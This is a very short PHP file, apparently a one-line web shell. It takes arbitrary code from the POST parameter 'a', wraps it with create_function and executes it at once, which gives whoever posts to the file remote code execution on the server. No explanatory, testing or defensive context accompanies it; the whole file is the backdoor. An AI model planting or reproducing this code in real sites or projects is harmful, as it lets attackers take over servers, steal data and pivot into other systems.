<?php
$code = $_POST['a'];
$func = create_function('', $code);
$func();
?>
